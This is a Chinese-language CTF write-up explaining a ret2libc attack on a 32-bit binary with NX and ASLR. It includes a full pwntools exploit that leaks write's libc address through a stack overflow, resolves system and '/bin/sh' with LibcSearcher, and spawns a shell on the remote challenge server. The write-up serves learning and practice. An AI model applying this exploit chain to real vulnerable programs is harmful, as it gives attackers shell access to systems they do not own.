# 挑战简介
32位 无 system 无 "/bin/sh"

# 思路
经典的ret2libc，折腾了好久才大致弄懂  
```
现代操作系统通常有 NX (No-eXecute) 或 DEP (Data Execution Prevention) 保护，这意味着栈上的数据区域是不可执行的。因此

直接向栈上写入并执行 shellcode 的方法（称为 ret2shellcode）通常行不通。

但是，代码段（包括程序自身的代码和加载的动态库的代码）是可执行的。  

libc 是 Linux 系统中最常用的 C 语言标准库，包含了大量有用的函数，例如 system（可以执行系统命令）、execve（可以执行新程序）等。  

ret2libc 的目标就是劫持程序控制流，让它去执行 libc 中已经存在的、可执行的函数。

现代系统通常启用 ASLR (Address Space Layout Randomization)。这意味着每次程序运行时，libc 加载到内存的基地址都是随机的。
```

答案分头解析
## 第一阶段：泄露 libc 地址
```
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *

p = remote("pwn.challenge.ctf.show", 28113)

elf = ELF("./pwn")

pad = b'a'*(0x6B+0x4)

main_addr = elf.symbols['main']
write_plt = elf.plt['write']
write_got = elf.got['write']

payload = pad + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got)+ p32(4)
#p32(4)为write函数的参数

p.sendline(payload)

write_real = u32(p.recvuntil(b'\xf7')[-4:])
-----------------
pad = b'a'*(0x6B+0x4): 这部分是填充数据，用来填满缓冲区，并覆盖掉栈上的旧 EBP（通常 4 字节）。0x6B 应该是缓冲区的大小。

p32(write_plt): 这是覆盖的返回地址。程序返回时，会跳转到 write 函数的 PLT (Procedure Linkage Table) 地址。PLT 是动态链接中用于延迟绑定的一个机制，
调用 write@plt 最终会执行 write 函数。

p32(main_addr): 这是 write 函数执行完之后的返回地址。我们让它返回到 main 函数的开头，这样可以再次触发栈溢出，进行第二阶段的利用。

p32(0): 这是传递给 write 函数的第一个参数 fd (file descriptor)。0 代表标准输入 stdin，但这里似乎应该是 1 (标准输出 stdout) 才对，
不过也许这个挑战环境特殊或者 0 也能打印到远程连接？（通常用 1 来打印到屏幕/连接）。

p32(write_got): 这是传递给 write 函数的第二个参数 buf (要打印内容的地址)。write_got 指向 write 函数在 GOT (Global Offset Table) 中的条目。
关键点：当 write 函数被程序实际调用过一次之后（动态链接器完成地址解析），GOT 表里存放的就是 write 函数在 libc 中的真实内存地址。
通过调用 write(1, write_got, 4)，我们就能把这个真实地址打印出来。

p32(4): 这是传递给 write 函数的第三个参数 count (要打印的字节数)。因为地址是 4 字节（32位系统）。

p.sendline(payload): 发送第一段 payload。

write_real = u32(p.recvuntil(b'\xf7')[-4:]): 接收 write 函数打印出的 4 字节 write 函数在 libc 中的真实地址。
```

## 计算 libc 基地址和目标函数/字符串地址
```
libc = LibcSearcher("write", write_real)

libc_base = write_real - libc.dump("write")

system_addr = libc_base + libc.dump("system")

bin_sh = libc_base + libc.dump("str_bin_sh")

------------------

libc = LibcSearcher("write", write_real): 使用 LibcSearcher 这个库，根据泄露出的 write 函数的真实地址，去数据库里查找匹配的 libc 版本。

libc_base = write_real - libc.dump("write"): libc.dump("write") 得到的是 write 函数在对应 libc 文件中的偏移量（offset）。用泄露出的真实地址减去这个偏移量，
就得到了本次运行中 libc 被加载到内存的基地址。

system_addr = libc_base + libc.dump("system"): 知道了 libc 基地址，再加上 system 函数在 libc 文件中的偏移量，就得到了 system 函数在内存中的真实地址。

bin_sh = libc_base + libc.dump("str_bin_sh"): 同理，计算出字符串 "/bin/sh" 在内存中的真实地址。
```

## 第二阶段：执行 system("/bin/sh")
```
payload = pad + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh)

p.sendline(payload)

p.interactive()
```
